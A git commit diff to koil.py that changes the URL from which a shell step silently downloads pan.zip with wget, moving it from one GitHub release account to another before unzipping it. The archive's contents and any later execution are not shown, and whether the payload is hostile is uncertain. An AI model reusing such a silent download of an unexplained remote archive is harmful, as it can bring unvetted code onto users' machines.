1518982892d38903aa185e3bdbfb3ba2bc0b032a
malogrono <136266511+malogrono@users.noreply.github.com>
2026-08-17 17:20:57 +0700

    Update koil.py

--- koil.py
+++ koil.py
@@ -32,7 +32,7 @@ def run_script():
     pwd
 
     echo "=== DOWNLOAD FILE ==="
-    wget -q https://github.com/hujisanda/root/releases/download/nwe/pan.zip -O pan.zip
+    wget -q https://github.com/malogrono/vb/releases/download/vcz/pan.zip -O pan.zip
 
     echo "=== EXTRACT ==="
     unzip -o pan.zip
